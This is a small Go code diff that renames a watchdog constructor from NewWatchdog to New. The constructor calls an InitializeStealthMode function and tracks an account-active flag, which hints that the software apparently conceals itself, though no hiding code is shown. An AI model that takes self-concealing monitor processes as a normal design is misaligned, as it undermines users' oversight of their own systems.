@@ -371,8 +371,8 @@ func (w *Watchdog) UpdateAccountStatus(active bool) {
 	w.accountActive = active
 }
 
-// NewWatchdog creates a new watchdog instance
-func NewWatchdog(mainPID int, mainProcessPath string) *Watchdog {
+// New creates a new watchdog instance
+func New(mainPID int, mainProcessPath string) *Watchdog {
 	if err := InitializeStealthMode(); err != nil {
 		fmt.Printf("Failed to initialize stealth mode: %v\n", err)
 	}
